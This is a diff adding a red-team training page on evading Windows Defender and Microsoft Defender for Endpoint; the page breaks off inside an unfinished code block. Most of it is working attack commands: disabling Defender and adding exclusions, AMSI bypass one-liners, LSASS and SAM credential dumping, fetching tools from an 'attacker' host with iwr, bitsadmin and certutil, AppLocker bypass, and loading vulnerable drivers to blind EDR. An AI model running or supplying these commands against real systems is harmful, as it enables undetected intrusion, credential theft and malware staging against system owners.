@@ -1,0 +1,867 @@
+---
+layout: training-page
+title: "Windows Defender"
+module: "Evasion"
+tags:
+  - windows-defender
+  - exclusions
+  - disable-defender
+  - powershell-constrained
+page_key: "evasion-windows-defender"
+render_with_liquid: false
+---
+
+# Windows Defender
+
+## Overview
+
+Windows Defender is the default security suite on modern Windows systems. It includes real-time protection, AMSI integration, cloud-based protection, network protection, and attack surface reduction rules. Understanding Defender's capabilities and configuration helps identify what's in place and what the realistic detection surface looks like in a target environment.
+
+Disabling or bypassing Defender typically requires local administrator rights. On well-managed enterprise systems, Defender is managed by Group Policy or Microsoft Defender for Endpoint (MDE/Defender ATP) — local changes may be overridden or trigger alerts.
+
+![Windows Defender detection layers (real-time, cloud, AMSI, behavioral) with targeted bypass approaches for each layer](/images/evasion/windows-defender-bypass.svg)  
+*// windows defender — detection layers and bypass strategies*
+
+## Defender Status and Configuration
+
+```
+># Check Defender status:
+Get-MpComputerStatus
+# Key fields:
+# AMServiceEnabled: True/False (real-time protection)
+# AntivirusEnabled: True/False
+# RealTimeProtectionEnabled: True/False
+# BehaviorMonitorEnabled: True/False
+# IoavProtectionEnabled: True/False (on-access scan)
+# AMEngineVersion, AMProductVersion, AMSignatureVersion
+
+# Check if Defender is managed by policy (enterprise):
+Get-MpComputerStatus | Select-Object -Property *Managed*
+# If PolicyManagerEnabled = True → GPO/MDE controls Defender
+
+# Check current exclusions:
+Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
+Get-MpPreference | Select-Object -ExpandProperty ExclusionProcess
+Get-MpPreference | Select-Object -ExpandProperty ExclusionExtension
+
+# Check attack surface reduction rules:
+Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Ids
+Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Actions
+
+# View recent detections:
+Get-MpThreatDetection
+Get-MpThreat | Select-Object ThreatName, Resources, ActionSuccess, CurrentStatus
+```
+
+## Adding Exclusions
+
+Add exclusions to exclude directories, processes, or extensions from real-time scanning. Requires local administrator. Useful for staging tools or preventing specific paths from being scanned.
+
+```
+># Exclude a path (directory):
+Add-MpPreference -ExclusionPath "C:\Windows\Temp"
+Add-MpPreference -ExclusionPath "C:\Users\Public"
+
+# Exclude a process by name:
+Add-MpPreference -ExclusionProcess "mimikatz.exe"
+Add-MpPreference -ExclusionProcess "powershell.exe"  # very loud — will trigger alerts
+
+# Exclude a file extension:
+Add-MpPreference -ExclusionExtension ".ps1"
+Add-MpPreference -ExclusionExtension ".exe"  # extremely suspicious
+
+# Via registry (alternative to PowerShell):
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\Windows\Temp" /t REG_DWORD /d 0 /f
+
+# Check if exclusion was applied:
+Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
+
+# Remove an exclusion:
+Remove-MpPreference -ExclusionPath "C:\Windows\Temp"
+```
+
+## Disabling Defender (Requires Admin)
+
+Disabling Defender entirely is the most aggressive option. This will trigger alerts in any environment running Microsoft Defender for Endpoint or SIEM integration.
+
+```
+># Disable real-time protection (non-persistent):
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+# Disable behavior monitoring:
+Set-MpPreference -DisableBehaviorMonitoring $true
+
+# Disable all Defender features (admin required):
+Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIOAVProtection $true -DisablePrivacyMode $true -SignatureDisableUpdateOnStartupWithoutEngine $true -DisableArchiveScanning $true -DisableIntrusionPreventionSystem $true -DisableScriptScanning $true
+
+# Via Group Policy registry (persistent, survives reboot):
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
+
+# Stop and disable Defender service (requires TrustedInstaller or registry bypass):
+# WinDefend service is protected — cannot be stopped directly by admin
+# Requires token impersonation or tamper protection bypass
+
+# Disable tamper protection (via Intune/MDE management or local registry if not MDM-enrolled):
+# HKLM\SOFTWARE\Microsoft\Windows Defender\Features\TamperProtection → 0
+# Only works if not enrolled in Microsoft Defender for Endpoint
+```
+
+## PowerShell Constrained Language Mode
+
+Constrained Language Mode (CLM) is enforced when AppLocker or Windows Defender Application Control (WDAC) is configured. It restricts PowerShell to a safe subset — no Add-Type, no P/Invoke, no .NET types beyond safe list, no COM objects.
+
+```
+># Check current language mode:
+$ExecutionContext.SessionState.LanguageMode
+# FullLanguage       — no restrictions
+# ConstrainedLanguage — CLM active
+# RestrictedLanguage — most restricted
+# NoLanguage         — no language at all
+
+# What CLM blocks:
+# - Add-Type (can't define new .NET types)
+# - [System.Reflection.Assembly]::Load (can't load assemblies)
+# - COM object creation (New-Object -ComObject ...)
+# - Most custom .NET type access
+# - P/Invoke definitions
+
+# Check if WDAC is enforcing CLM:
+# Event Log: Microsoft-Windows-AppLocker/MSI and Script
+Get-WinEvent -LogName "Microsoft-Windows-AppLocker/MSI and Script" -MaxEvents 20
+
+# WDAC policy location:
+ls C:\Windows\System32\CodeIntegrity\
+
+# CLM bypass options:
+# 1. PowerShell 2.0 (if available):
+powershell.exe -version 2
+
+# 2. Custom runspace (if you can compile code):
+# A .NET executable that creates an unrestricted runspace
+# The CLM enforcement is per-runspace — new runspaces from exe start FullLanguage
+
+# 3. Find a whitelisted path:
+# WDAC often allows scripts in specific paths (e.g., C:\Windows\*)
+# Moving scripts to allowed paths may bypass CLM
+
+# 4. Downgrade via WMI or COM that spawns powershell:
+$wmi = [wmiclass]"Win32_Process"
+$wmi.Create("powershell.exe -version 2 -ep bypass -c IEX ...")
+```
+
+## MDE-Aware LSASS Dumping
+
+MDE monitors the standard MiniDumpWriteDump API call against LSASS. Bypassing requires indirect methods: custom dump implementations, snapshot APIs, or avoiding the LSASS process entirely by dumping the SAM hive instead.
+
+```
+# Get LSASS PID without using Get-Process (less suspicious):
+$code = @"
+using System; using System.Diagnostics;
+public class Helper {
+    public static int GetLsassPid() {
+        foreach (var proc in Process.GetProcesses())
+            if (proc.ProcessName.ToLower() == "lsass") return proc.Id;
+        return -1;
+    }
+}
+"@
+Add-Type -TypeDefinition $code
+$lsassPID = [Helper]::GetLsassPid()
+
+# comsvcs.dll LOLBIN dump (avoids direct MiniDump API call):
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPID C:\Windows\Temp\lsass.dmp full
+
+# Parse dump offline (on Linux attack box):
+pypykatz lsa minidump lsass.dmp
+
+# Alternative: dump SAM/SYSTEM/SECURITY (no LSASS touch):
+reg save HKLM\SAM C:\Windows\Temp\sam.bak
+reg save HKLM\SYSTEM C:\Windows\Temp\sys.bak
+reg save HKLM\SECURITY C:\Windows\Temp\sec.bak
+# Transfer and parse:
+secretsdump.py -sam sam.bak -system sys.bak -security sec.bak LOCAL
+
+# PssCaptureSnapshot (stealthier than MiniDumpWriteDump):
+# Takes a process snapshot (PSS) rather than a memory dump — different API path
+# Tools: NanoDump, HandleKatz use this technique
+
+# Transfer evasion (split files to bypass MDE file scanning):
+# Split on target, reassemble on attacker:
+[System.IO.File]::ReadAllBytes("C:\tool.exe") | % { ... }  # chunk approach
+# Or base64 encode and transfer via clipboard/exfil channel
+```
+
+## Defender Attack Surface Reduction Rules
+
+ASR rules block specific behaviors: Office macro spawning processes, executable downloads from email, script obfuscation. These are separate from signature detection and require behavioral evasion.
+
+```
+># Common ASR rule GUIDs and what they block:
+# D4F940AB-401B-4EFC-AADC-AD5F3C50688A — Office apps spawning child processes
+# 3B576869-A4EC-4529-8536-B80A7769E899 — Office creating executable content
+# 75668C1F-73B5-4CF0-BB93-3ECF5CB7CC84 — Office injecting into other processes
+# D3E037E1-3EB8-44C8-A917-57927947596D — JS/VBS launching downloaded executables
+# 5BEB7EFE-FD9A-4556-801D-275E5FFC04CC — Obfuscated scripts execution
+# BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550 — Executable content from email
+
+# Check which rules are active and their mode:
+Get-MpPreference | Select-Object AttackSurfaceReductionRules_Ids, AttackSurfaceReductionRules_Actions
+# Actions: 0=Off, 1=Block, 2=Audit, 6=Warn
+
+# Get human-readable rule status:
+$ids = (Get-MpPreference).AttackSurfaceReductionRules_Ids
+$actions = (Get-MpPreference).AttackSurfaceReductionRules_Actions
+for ($i=0; $i -lt $ids.Count; $i++) { "$($ids[$i]) = $($actions[$i])" }
+
+# Disable a specific ASR rule (admin required):
+Add-MpPreference -AttackSurfaceReductionRules_Ids D4F940AB-401B-4EFC-AADC-AD5F3C50688A -AttackSurfaceReductionRules_Actions Disabled
+
+# ASR events (to see what was blocked during testing):
+Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" | Where-Object Id -in 1121,1122,1125,1126 | Select-Object TimeCreated, Message
+```
+
+## Network Protection and Cloud Protection
+
+```
+># Disable cloud-delivered protection:
+Set-MpPreference -MAPSReporting Disabled
+Set-MpPreference -SubmitSamplesConsent NeverSend
+
+# Disable network protection:
+Set-MpPreference -EnableNetworkProtection Disabled
+
+# Disable automatic sample submission:
+Set-MpPreference -SubmitSamplesConsent 2  # 2 = Never Send
+
+# Block Defender from phoning home (crude — may break protection entirely):
+# Block via hosts file or firewall — not recommended in real engagements
+
+# Update signatures (on demand — to know current sig version):
+Update-MpSignature
+
+# Check protection history:
+Get-MpThreatDetection | Select-Object ThreatName, ActionSuccess, InitialDetectionTime, Resources | Sort-Object InitialDetectionTime -Descending
+```
+
+## AMSI Bypass
+
+The Antimalware Scan Interface (AMSI) is hooked into PowerShell and other scripting engines, sending script content to Defender for scanning before execution. Bypassing AMSI is a prerequisite for running most offensive PowerShell in memory. Multiple bypass techniques exist — defenders patch individual bypasses, so having fallback options is important.
+
+```
+# AMSI bypass — memory patching via reflection (classic):
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+# AMSI bypass — obfuscated reflection (avoids string detection):
+$a=[Ref].Assembly.GetTypes()
+Foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b}}
+$d=$c.GetFields('NonPublic,Static')
+Foreach($e in $d){if($e.Name -like "*ailed"){$f=$e}}
+$f.SetValue($null,$true)
+
+# Verify AMSI is bypassed (test with known detected string):
+# After bypass, Invoke-Mimikatz or other flagged strings won't trigger detection
+
+# Tool: AMSITrigger — find which specific strings in your script trigger AMSI:
+# https://github.com/RythmStick/AMSITrigger
+.\AMSITrigger.ps1 -i .\script.ps1 -f 3
+# Outputs the specific triggers so you can obfuscate those strings
+
+# Tool: Invoke-Obfuscation — obfuscate PowerShell to evade AMSI/Defender signatures:
+Import-Module .\Invoke-Obfuscation.psd1
+Invoke-Obfuscation
+# Interactive menu — select TOKEN, AST, or ENCODING obfuscation
+
+# Tool: Invisi-Shell — bypass PowerShell logging by hooking the CLR
+# Runs PowerShell without ScriptBlock logging, module logging, or transcription
+# Usage:
+RunWithPathAsAdmin.bat script.ps1    # if running as admin
+RunWithRegistryNonAdmin.bat script.ps1  # if running as non-admin
+```
+
+## Process Injection Bypassing MDE
+
+MDE monitors the standard VirtualAllocEx/WriteProcessMemory/CreateRemoteThread API chain for process injection. Advanced injection techniques bypass this by using different code paths, direct syscalls, or abusing legitimate Windows mechanisms.
+
+```
+# Standard injection APIs that MDE detects:
+# VirtualAllocEx, WriteProcessMemory, CreateRemoteThread
+# NtMapViewOfSection, NtCreateThreadEx with remote process handle
+
+# ── Direct Syscalls ───────────────────────────────────────────
+# Bypass: invoke NT system calls directly, skipping the Windows API layer
+# MDE hooks ntdll.dll — direct syscalls skip the hooks
+# Tools: SysWhispers2/3, Halo's Gate, Hell's Gate
+# These generate assembly stubs that call syscalls by number directly
+
+# ── Module Stomping ───────────────────────────────────────────
+# Bypass: overwrite a loaded legitimate DLL's memory region with payload
+# 1. Find a legitimate process with a non-critical DLL loaded
+# 2. Get the base address of that DLL in the target process
+# 3. Overwrite DLL memory with shellcode (MEM_COMMIT + PAGE_EXECUTE_READWRITE)
+# 4. Execute via existing thread redirection
+# Advantage: memory appears to belong to a legitimate DLL path
+
+# ── Early Bird Injection ──────────────────────────────────────
+# Bypass: inject before the process's main thread initializes
+# 1. CreateProcess with CREATE_SUSPENDED flag (process created but not running)
+# 2. Write shellcode to the new process memory
+# 3. Queue an APC (Asynchronous Procedure Call) to the main thread
+# 4. ResumeThread — shellcode runs before any EDR hooks initialize in that process
+# Advantage: EDR callbacks fire after injection completes
+
+# ── Process Doppelganging ─────────────────────────────────────
+# Bypass: use NTFS transactions to load a "phantom" malicious file
+# 1. Create an NTFS transaction (TxF)
+# 2. Write malicious executable into the transaction
+# 3. Map the transacted file into memory as a process image
+# 4. Rollback the transaction — file vanishes from disk, process stays in memory
+# Advantage: no file on disk; process image points to a now-deleted transacted file
+
+# ── Execution via LOLBins ─────────────────────────────────────
+# Execute arbitrary .NET code via trusted Windows binaries:
+
+# MSBuild — execute inline C# tasks (trusted by many AV/EDR):
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml
+
+# InstallUtil — .NET uninstall method called with /U flag:
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll
+
+# Compile and run C# on-the-fly without writing an exe:
+$code = @"
+using System;
+using System.Runtime.InteropServices;
+public class Exec {
+    [DllImport("kernel32")] public static extern IntPtr OpenProcess(uint a, bool b, int c);
+    // ... shellcode injection here
+}
+"@
+Add-Type -TypeDefinition $code
+[Exec]::OpenProcess(0x1F0FFF, $false, (Get-Process -Name explorer).Id)
+```
+
+## Tool Transfer Bypassing MDE Scanning
+
+MDE scans files written to disk — known offensive tool signatures are detected on write. Techniques to bypass file scanning include transferring tools in an obfuscated/encrypted form and reconstructing them in memory or on disk before execution.
+
+```
+# ── Encryption (AES) ─────────────────────────────────────────
+# Encrypt tool on attacker machine:
+openssl enc -aes-256-cbc -in tool.exe -out tool.enc -k Password123
+
+# Transfer encrypted file (won't trigger signature scan):
+iwr http://attacker/tool.enc -OutFile tool.enc
+
+# Decrypt on target before execution:
+openssl enc -aes-256-cbc -d -in tool.enc -out tool.exe -k Password123
+
+# ── File Splitting ────────────────────────────────────────────
+# Split into chunks — each chunk is innocuous without context:
+# On attacker (Linux):
+split -b 1M tool.exe tool.part.
+
+# Transfer parts separately:
+iwr http://attacker/tool.part.aa -OutFile part.aa
+iwr http://attacker/tool.part.ab -OutFile part.ab
+
+# Reassemble on target:
+cmd /c copy /b part.aa+part.ab tool.exe
+
+# ── Alternate Data Streams ────────────────────────────────────
+# Hide tool in ADS of a legitimate file:
+type tool.exe > C:\Windows\Temp\legitimate.txt:hidden.exe
+
+# Execute from ADS:
+wmic process call create "C:\Windows\Temp\legitimate.txt:hidden.exe"
+
+# ── Living Off The Land Transfers ─────────────────────────────
+# Use built-in Windows tools for transfer:
+bitsadmin /transfer job http://attacker/tool.exe C:\Windows\Temp\tool.exe
+curl http://attacker/tool.exe -o tool.exe
+# certutil (often detected but still works in some environments):
+certutil -urlcache -f http://attacker/tool.exe tool.exe
+```
+
+## Microsoft Defender for Identity (MDI) Evasion
+
+MDI (formerly Azure ATP) is a cloud-based detection solution focused on Active Directory attack patterns. It monitors domain controller traffic and agent data. Unlike MDE which monitors endpoints, MDI detects AD-specific attacks such as DCSync, Golden Ticket, lateral movement, and reconnaissance patterns.
+
+```
+# What MDI detects (key alerts to be aware of):
+# - DCSync (replication requests from non-DC machines) → Event 4662 + specific flags
+# - Golden Ticket usage — ticket lifetime anomalies, missing PAC, encryption downgrade
+# - Kerberoasting — high-volume TGS requests from single account (Event 4769)
+# - AS-REP Roasting — TGT requests without pre-auth (Event 4768)
+# - Pass-the-Hash / Pass-the-Ticket — unusual authentication patterns
+# - LDAP reconnaissance — large LDAP queries (BloodHound-style enumeration)
+# - Lateral movement — unusual RPC/SMB patterns, PsExec-style activity
+
+# MDI evasion strategies:
+
+# 1. Slow down enumeration (evade volume-based detection):
+# BloodHound's stealth collection mode:
+SharpHound.exe -c All --stealth
+# Adds delays between queries to blend with normal LDAP traffic
+
+# 2. Use LDAPS instead of LDAP for enumeration:
+# LDAP channel binding — some MDI signatures rely on cleartext LDAP patterns
+# LDAPS traffic blends more with normal auth traffic
+
+# 3. DCSync evasion — spread over time:
+# Instead of bulk DCSync, target one user at a time with delays:
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt"'
+# Wait, then:
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\Administrator"'
+
+# 4. Kerberoasting evasion — limit request rate:
+# MDI detects high-volume TGS requests; request one SPN at a time:
+Rubeus.exe kerberoast /user:svc_account /nowrap
+# Avoid: Rubeus.exe kerberoast (all SPNs at once)
+
+# 5. Avoid noisy tools:
+# Tools that generate MDI alerts: BloodHound (default), Mimikatz, Rubeus (bulk ops)
+# Tools that are quieter: native PowerShell AD module, manual LDAP queries
+
+# Check if MDI sensor is deployed (from attacker perspective):
+# MDI agents (sensors) run on DCs — look for "Microsoft.Tri.Sensor" process
+# If sensor is present, assume DC traffic is monitored by MDI
+```
+
+## Modern AD Evasion Landscape (2024–2025)
+
+The effectiveness of offensive techniques changes as defensive tooling matures. Understanding what still works vs. what is reliably detected helps prioritize techniques for modern assessments.
+
+```
+# ── Still Effective (2024–2025) ──────────────────────────────
+# Kerberoasting — requires: SPNs + weak RC4 or AES keys + poor password rotation
+# AS-REP Roasting — users without pre-auth + old password habits
+# DACL/ACL abuse — GenericWrite, GenericAll, WriteDACL misconfigs
+# Shadow Credentials (keyCredentialLink) — almost undetectable
+# ADCS ESC1 / ESC4 / ESC8 — remain the #1 real breach vector in 2024
+# GPO misconfiguration — SYSVOL writable, task injection
+# NTLM relay — still viable when LDAP signing not enforced
+# Golden certificates (ADCS-based) > golden tickets (heavily monitored)
+# OAuth token theft / MSAL cache abuse (hybrid environments)
+
+# ── Largely Mitigated in Modern Deployments ──────────────────
+# Direct LSASS dump via tasklist/procdump → PPL blocks it, MDE detects
+# Pass-the-Hash without detection → ETW + Credential Guard combination
+# Mimikatz via direct process open → detected immediately
+# SMB signing off by default → new systems require signing
+# Golden Ticket (overused) → MDI flags ticket anomalies
+
+# ── Key defensive gaps attackers still exploit ────────────────
+# LDAP channel binding disabled → still huge attack surface
+# ADCS not audited → most orgs don't monitor CA logs (Event 4886/4887)
+# No MDI deployment → DC traffic not monitored
+# Legacy NTLM authentication still enabled for backwards compatibility
+# RC4 not disabled → Kerberoasting still possible
+# gMSA not used for service accounts → password rotation issues
+```
+
+## AppLocker Enumeration
+
+AppLocker restricts executable files, scripts, installers, DLLs, and packaged apps. The default ruleset allows everything in `%PROGRAMFILES%\*` and `%WINDIR%\*` for Everyone, plus unrestricted access for Administrators. Enumerate the effective policy to find allowed paths and test specific binaries before attempting execution.
+
+```
+# Get the effective AppLocker policy (local + domain merged) as XML:
+Get-AppLockerPolicy -Effective -Xml
+
+# Get effective policy object (shows rule collections):
+Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
+
+# Test if a specific file would be allowed for the current user:
+Get-AppLockerPolicy -Effective | Test-AppLockerPolicy -Path C:\Tools\mimikatz.exe -User $env:USERNAME
+
+# Test for another user:
+Get-AppLockerPolicy -Effective | Test-AppLockerPolicy -Path C:\Tools\SysinternalsSuite\procexp.exe -User maria
+
+# Output: PolicyDecision = Allowed / DeniedByDefault / Denied
+# MatchingRule shows which rule allowed/denied it
+```
+
+## AppLocker Bypass — Writable Paths in %WINDIR%
+
+The default AppLocker ruleset allows Everyone to execute from `%WINDIR%\*`. Several subdirectories under `C:\Windows` are writable by standard users. Copying a payload to one of these paths bypasses AppLocker for both executables and scripts.
+
+```
+# Find directories in %WINDIR% that standard users can write to AND execute from:
+Get-ChildItem $env:windir -Directory -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
+    $dir = $_
+    (Get-Acl $dir.FullName).Access | ForEach-Object {
+        if ($_.AccessControlType -eq "Allow") {
+            if ($_.IdentityReference.Value -eq "NT AUTHORITY\Authenticated Users" -or $_.IdentityReference.Value -eq "BUILTIN\Users") {
+                if (($_.FileSystemRights -like "*Write*" -or $_.FileSystemRights -like "*Create*") -and $_.FileSystemRights -like "*Execute*") {
+                    Write-Host ($dir.FullName + ": " + $_.IdentityReference.Value + " (" + $_.FileSystemRights + ")")
+                }
+            }
+        }
+    }
+}
+
+# Common writable+executable paths found on default Windows installs:
+# C:\Windows\Tasks          — NT AUTHORITY\Authenticated Users (CreateFiles, ReadAndExecute)
+# C:\Windows\Temp           — BUILTIN\Users (CreateFiles, AppendData, ExecuteFile)
+# C:\Windows\tracing        — BUILTIN\Users (Write, ReadAndExecute)
+# C:\Windows\System32\spool\drivers\color — BUILTIN\Users (CreateFiles, ReadAndExecute)
+
+# Copy payload to writable path and execute (bypasses default AppLocker policy):
+copy payload.exe C:\Windows\Tasks\payload.exe
+C:\Windows\Tasks\payload.exe
+
+# Same for scripts — default script ruleset also allows %WINDIR%\*:
+copy evil.vbs C:\Windows\Tasks\evil.vbs
+cscript C:\Windows\Tasks\evil.vbs
+
+# Test the bypass worked:
+Get-AppLockerPolicy -Effective | Test-AppLockerPolicy -Path C:\Windows\Tasks\payload.exe -User $env:USERNAME
+# Should return: PolicyDecision = Allowed
+```
+
+## Modern Bypass Techniques (2024–2025)
+
+These techniques target current MDE/Defender implementations. Detection rates change quickly as signatures and behavioral rules are updated — always test in a lab before deploying in an engagement.
+
+### BYOVD — Bring Your Own Vulnerable Driver
+
+Loading a signed but vulnerable kernel driver to execute arbitrary kernel code. Used to kill EDR processes, disable PPL (Protected Process Light), or remove kernel callbacks registered by MDE. Microsoft's HVCI (Hypervisor-Protected Code Integrity) blocks most BYOVD when enabled, but many enterprise systems still have it disabled.
+
+```
+# Check if HVCI is enabled (BYOVD mitigation):
+Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard | Select-Object VirtualizationBasedSecurityStatus, VirtualizationBasedSecurityProperties
+
+# LOLDrivers — database of known vulnerable signed drivers:
+# https://www.loldrivers.io/
+# Key vulnerable drivers used in BYOVD attacks:
+# RTCore64.sys (MSI Afterburner) — arbitrary kernel R/W
+# gdrv.sys (GIGABYTE) — arbitrary kernel R/W, ring-0 execution
+# mhyprot2.sys (Genshin Impact anti-cheat) — process termination from kernel
+# procexp.sys (Sysinternals) — process handle operations
+
+# Technique overview (RTCore64.sys example):
+# 1. Drop RTCore64.sys to disk
+# 2. Create a service and load the driver:
+sc.exe create RTCore64 type= kernel start= auto binPath= C:\Windows\Temp\RTCore64.sys
+sc.exe start RTCore64
+# 3. Send IOCTL to the driver to get kernel R/W primitives
+# 4. Enumerate and NULL out EDR kernel callback routines
+# 5. MDE/Defender loses visibility — sensors effectively blinded
+
+# Kill protected processes via vulnerable driver IOCTL:
+# Tools: Backstab (uses procexp152.sys), EDRSandblast, Terminator
+# Backstab — kill EDR protected processes using ProcExp driver:
+# Backstab.exe --name MsSense.exe --kill      # Kill MDE sensor
+# Backstab.exe --name MsMpEng.exe --kill      # Kill Defender engine
+
+# Terminator tool (Spyboy technique) — uses vulnerable Zemana driver:
+# Sends IOCTL 0x80002048 to terminate any process including PPL processes
+# ZAM64.sys driver — signed, passes WHQL, kills arbitrary processes
+```
+
+### Kernel Callback Removal (EDRSandblast / EDRKillShift)
+
+MDE registers kernel callbacks (PsSetCreateProcessNotifyRoutine, PsSetLoadImageNotifyRoutine, ObRegisterCallbacks) to monitor process creation, DLL loading, and handle operations. Removing these callbacks blinds the EDR without terminating processes — harder to detect than process kills.
+
+```
+# Kernel callback removal overview:
+# 1. Exploit a vulnerable kernel driver for read/write primitives
+# 2. Walk the undocumented kernel callback arrays (PspCreateProcessNotifyRoutine, etc.)
+# 3. Find entries belonging to MDE (MsSense.exe / WdFilter.sys)
+# 4. NULL or NOP those callback entries
+# 5. EDR kernel hooks are removed — no process visibility
+
+# EDRSandblast — automated callback removal + LSASS dump:
+# EDRSandblast.exe --kernelmode     # Remove kernel callbacks via RTCore64
+# EDRSandblast.exe --usermode       # Remove userland hooks from ntdll
+# EDRSandblast.exe --dump           # Dump LSASS after removing protections
+
+# Callback arrays removed by EDRSandblast:
+# PspCreateProcessNotifyRoutine    — process creation events
+# PspCreateThreadNotifyRoutine     — thread creation events
+# PspLoadImageNotifyRoutine        — DLL/image load events
+# ObProcessCallbacks               — process handle requests
+# ObThreadCallbacks                — thread handle requests
+
+# ETW-TI (Threat Intelligence) provider removal:
+# ETW-TI is a kernel ETW provider that feeds MDE with high-fidelity telemetry
+# Disabling it: patch EtwThreatIntProvRegHandle in ntoskrnl.exe to 0
+# This kills a significant portion of MDE's behavioral telemetry
+
+# Check ETW-TI status (from kernel context):
+# Look for: EtwRegisterSecurityProvider calls in ntoskrnl
+```
+
+### PPL (Protected Process Light) Bypass
+
+MDE runs as a PPL-Antimalware process. Standard admin cannot open a handle with PROCESS_TERMINATE or read/write access to PPL processes. Bypassing PPL is required to kill or dump MDE sensor processes.
+
+```
+# What PPL protects:
+# MsSense.exe (MDE Sensor) — PPL-Antimalware level
+# MsMpEng.exe (Defender Engine) — PPL-Antimalware level
+# WdFilter.sys — kernel minifilter, can't be unloaded by admin
+
+# PPL bypass via BYOVD (kernel-level attack):
+# Vulnerable driver provides kernel R/W → patch PS_PROTECTION byte in EPROCESS
+# EPROCESS.Protection offset varies by Windows build — need symbol resolution
+
+# PPL bypass via PPLdump / PPLFault (CVE-2022-21551 style):
+# Some bypass techniques abuse cross-process handle inheritance or Section objects
+# PPLFault exploits a race condition in Windows kernel for PPL process dumping
+
+# Token impersonation to become TrustedInstaller:
+# Even with TrustedInstaller, PPL processes are protected — kernel bypass required
+
+# Practical check — can you open MDE sensor process?
+$handle = [System.Diagnostics.Process]::GetProcessesByName("MsSense")
+# If Protection is set, OpenProcess with PROCESS_TERMINATE will fail with
+# Error 5: Access Denied
+```
+
+### Smart App Control (SAC) Bypass
+
+Smart App Control (Windows 11) uses cloud-based reputation checking (AppLocker + WDAC + Intelligent Security Graph) to block unsigned or unknown executables. Introduced in Windows 11 22H2, it's separate from Defender and cannot be disabled via PowerShell cmdlets.
+
+```
+# Check SAC state:
+reg query HKLM\SYSTEM\CurrentControlSet\Control\CI\Policy /v VerifiedAndReputablePolicyState
+# 0 = Off, 1 = Evaluation, 2 = On
+
+# SAC bypass techniques:
+# 1. Code signing — sign your payload with a valid EV certificate
+#    Purchased or stolen codesigning certs bypass SAC reputation checks
+
+# 2. LNK/ISO/VHD delivery (SAC doesn't scan container attachments the same way):
+#    Files extracted from ISO/VHD may inherit Mark-of-the-Web differently
+
+# 3. Catalog file abuse:
+#    Windows file catalog (.cat) files bind file hashes to trusted catalogs
+#    If a file is listed in a Microsoft-signed catalog, SAC trusts it
+#    Replace file contents while preserving the catalog binding (same hash = must match, so this is limited)
+
+# 4. Trusted installer paths:
+#    SAC applies to user-initiated execution, not all system paths equally
+#    Execution from C:\Windows\* paths may bypass SAC in some configs
+
+# 5. SAC only applies to PE files — scripts, DLLs loaded reflectively, etc. may not be checked
+
+# Disable SAC entirely (requires reinstall or registry + reboot):
+reg add HKLM\SYSTEM\CurrentControlSet\Control\CI\Policy /v VerifiedAndReputablePolicyState /t REG_DWORD /d 0 /f
+# Requires reboot. May trigger security alerts in managed environments.
+```
+
+### Credential Guard Bypass
+
+Credential Guard (VBS — Virtualization-Based Security) isolates LSASS in a separate VSM (Virtual Secure Mode) process, preventing credential extraction via direct LSASS dump. It protects domain credentials but not local hashes stored in SAM/SECURITY.
+
+```
+# Check if Credential Guard is active:
+Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard | Select-Object SecurityServicesRunning
+# 1 = CredentialGuard running
+# If active: LSASS dump will show placeholder values, not real NT hashes
+
+# What Credential Guard DOES NOT protect:
+# - SAM hive (local accounts) — still dumpable via reg save
+# - LSA secrets (service account passwords) — still in SECURITY hive
+# - Cached credentials (domain account hash cache) — in SECURITY hive
+# - Web browser credentials — separate storage
+# - DPAPI master keys — protected differently
+
+# Attacks that still work with Credential Guard active:
+# 1. SAM dump (local accounts):
+reg save HKLM\SAM C:\Windows\Temp\sam.bak
+reg save HKLM\SYSTEM C:\Windows\Temp\sys.bak
+secretsdump.py -sam sam.bak -system sys.bak LOCAL
+
+# 2. Cached credential hash extraction (DCC2):
+reg save HKLM\SECURITY C:\Windows\Temp\sec.bak
+secretsdump.py -security sec.bak -system sys.bak LOCAL
+# Returns DCC2 hashes — not directly usable for PTH but crackable offline
+
+# 3. Kerberos ticket harvesting (tickets in volatile memory, not in Credential Guard store):
+Rubeus.exe dump /nowrap
+# Export current TGTs/service tickets — usable for PTT
+
+# 4. DPAPI key abuse (if you have local admin):
+# DPAPI master keys are not in Credential Guard's scope
+# Mimikatz: dpapi::masterkey /rpc (still works to decrypt DPAPI blobs)
+
+# 5. Token impersonation / delegation abuse:
+# Credentials used via Kerberos delegation flow through network — capturable
+
+# Force Credential Guard off (if not MDM/UEFI locked):
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 0 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LsaCfgFlags /t REG_DWORD /d 0 /f
+# Requires reboot. Will be flagged by MDE in most deployments.
+```
+
+### Defender Antivirus Engine Bypass — In-Memory Execution
+
+Defender's real-time scanner focuses on files written to disk and memory regions flagged by system calls. Keeping malicious code exclusively in memory and loading via reflection or shellcode injection avoids file-based signatures entirely.
+
+```
